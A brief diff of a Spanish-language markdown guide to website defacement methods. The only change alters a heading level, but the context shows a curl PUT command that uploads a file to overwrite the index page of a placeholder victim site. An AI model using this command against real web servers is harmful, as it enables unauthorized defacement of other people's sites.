@@ -4,7 +4,7 @@ modifica o reemplaza el contenido de un sitio web sin autorización
 
 ## Metodos mas usados para deface web 
 
-## 1.- Metodo PUT
+### 1.- Metodo PUT
 
 curl -X PUT -d "@index25.htm" http://victima.com/index.htm
 
